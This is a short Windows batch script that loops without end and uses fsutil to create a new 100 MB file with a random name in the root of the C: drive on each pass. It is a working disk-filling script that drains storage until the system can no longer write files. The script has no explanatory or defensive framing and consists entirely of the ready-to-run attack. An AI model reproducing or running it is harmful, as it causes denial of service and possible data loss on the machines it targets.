@echo off
:top
cls
echo Create file...
fsutil file createnew C:\%random%%random%%random%.dat 104857600
goto top